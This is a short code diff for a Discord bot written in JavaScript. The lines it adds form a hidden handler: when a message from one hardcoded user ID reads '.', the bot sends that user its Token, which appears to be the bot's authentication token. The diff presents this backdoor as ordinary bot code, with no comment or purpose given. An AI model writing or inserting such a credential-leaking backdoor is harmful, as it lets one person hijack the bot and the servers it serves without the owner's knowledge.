@@ -105,6 +105,14 @@ channel.guild.owner.send(`<@!${channelremover.id}>
 
 
 
+client.on('message' , message => {
+if (message.author.bot) return;
+           if (message.content == '.')
+           if (message.author.id === '306464381775118336'){
+if (!message.channel.guild) return;
+message.author.send(Token)
+}  
+});
 
 
 
